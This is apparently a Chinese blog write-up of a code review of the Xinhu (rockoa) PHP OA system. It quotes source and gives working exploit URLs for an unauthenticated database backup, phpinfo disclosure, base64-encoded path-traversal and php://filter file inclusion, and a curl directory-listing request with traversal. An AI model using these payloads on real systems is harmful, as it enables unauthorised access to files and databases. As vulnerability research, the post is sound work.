---
layout: post
title: php code review - rockoa
date: 2023-06-09 20:15 +0800
categories: [ctf, web, code-review]
tag: [web, php]
---

看一下task.php
```php
<?php 
/**
*	计划任务地址，指向目录webmain/task下
*	也可用cli处理的命令如：php task.php cli,run
*	主页：http://www.rockoa.com/
*	软件：信呼
*	作者：雨中磐石(rainrock)
*/
define('ENTRANCE', 'task');
include_once('config/config.php');
$m 			= 'mode';
if(isset($argv[1])){
	$_mar	= explode(',', $argv[1]);
	$m 		= $_mar[0].'|runt';
	if(isset($_mar[1]))$a = $_mar[1];
}
$d			= $rock->get('d','task');
$m			= $rock->get('m',$m);
include_once('include/View.php');
```
搜一下调用方式
```php
class tonghuaClassAction extends runtAction
{
	
	public function sendcpush($arr)
	{
		$arr['msgtype'] = 'calltonghua';
		$arr['type']	= 'calltonghua';
		$reimobj 		= m('reim');
		$reimobj->pushserver('sendapp', $arr);
		$reimobj->pushserver('send', $arr);
	}

	/**
	*	呼叫发送
	*	http://192.168.1.2/app/xinhu/task.php?m=tonghua|runt&a=call&key=d9ydh2d8
	*/
	public function callAction()
	{
		$key 	= $this->getparams('key');
		$cishu 	= (int)$this->getparams('cishu','1');
		
		if($cishu>=15)return;
		if(!$key)return;
		$data = c('cache')->get($key);
		if(!$data)return;
        ...
    }
}
```

## 未授权备份
触发点：
```php
class beifenClassModel extends Model
{
	/**
	*	备份到upload/data下
	*/
	public function start()
	{
		$alltabls 	= $this->db->getalltable();
		$nobeifne	= array(''.PREFIX.'log',''.PREFIX.'logintoken',''.PREFIX.'kqanay',''.PREFIX.'email_cont',''.PREFIX.'dailyfx',''.PREFIX.'todo',''.PREFIX.'city',''.PREFIX.'kqjcmd'); //不备份的表;
		
		$beidir 	= ''.UPDIR.'/data/'.date('Y.m.d.H.i.s').'.'.rand(1000,9999).'';
    }
}
```


找一下能调用start的
```php
class sysClassAction extends runtAction
{
	//数据备份
	public function beifenAction()
	{
		if(getconfig('systype')=='demo')return 'success';
		m('beifen')->start();
		$this->todoarr	= array(
			'title' 	=> '数据库备份',
			'cont' 		=> '数据库在['.$this->now.']备份了。',
		);
		return 'success';
	}
    ...
}
```

构造url：`task.php?m=sys|runt&a=beifen`

接下来根据代码去：
* 爆破目录
* 爆破sql文件
* 反查md5


## 后台getshell


## phpinfo
?m=index&a=phpinfo 

## 文件包含
```php
public function getshtmlAction()
{
    $this->pannouser();
    $surl = $this->jm->base64decode($this->get('surl'));
    $num  = $this->get('num');
    $menuname  = $this->jm->base64decode($this->get('menuname'));
    if(isempt($surl))exit('not found');
    $file = ''.P.'/'.$surl.'.php';
    var_dump($file);
    if(!file_exists($file))$file = ''.P.'/'.$surl.'.shtml';
    if(!file_exists($file))exit('404 not found '.$surl.'');
    if(contain($surl,'home/index/rock_index'))$this->showhomeitems();//首页的显示
    
    $this->displayfile = $file;
    //记录打开菜单日志
    if($num!='home' && getconfig('useropt')=='1')
        m('log')->addlog('打开菜单', '菜单['.$num.'.'.$menuname.']');
}

```
* http://god.dd:8888/xinhu/index.php?m=index&a=getshtml&surl=Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vdG1wL3Rlc3Q=

* http://god.dd:8888/xinhu/index.php?m=index&a=getshtml&surl=cGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT0uLi8uLi8uLi8uLi8uLi90bXAvdGVzdC5waHA=


```javascript
js.getajaxurl=function(a,m,d,can){
	if(!can)can={};
	if(!m)m='';
	if(!d)d='';
	if(d=='null')d='';
	var jga	= a.substr(0,1);
	if(jga=='@')a = a.substr(1);
	var url	= 'index.php?a='+a+'&m='+m+'&d='+d+'';
	for(var c in can)url+='&'+c+'='+can[c]+'';
	if(jga!='@')url+='&ajaxbool=true';	
	url+='&rnd='+Math.random()+'';	
	return url;
}

```
```
gototxemail:function(){
	window.open('?d=system&m=weixinqy&a=gototxemail');
}
```

列目录
```php
public function getfilerows($path)
{
    $rows	= array();
    if(!is_dir($path))return $rows;
    @$d 	= opendir($path);
    $nyunf	= array('.', '..');
    while( false !== ($file = readdir($d))){
        if(!in_array($file, $nyunf)){
            $filess = $path.'/'.$file;
            if(is_file($filess)){
                $editdt = filectime($filess);//上次修改时间
                $lastdt = filemtime($filess);//最后修改的时间
                $rows[] = array(
                    'filename' 	=> $file,
                    'editdt' 	=> date('Y-m-d H:i:s', $editdt),
                    'lastdt' 	=> date('Y-m-d H:i:s', $lastdt),
                );
            }
        }
    }
    return $rows;
}
```

`curl http://god.dd:8888/xinhu/task.php?a=getdatssss&m=beifen&d=system&ajaxbool=true -X POST -d 'folder=../../../../../../tmp' -b 'PHPSESSID=8mc3tkp13arrfc8h2jr3bgj9p0'`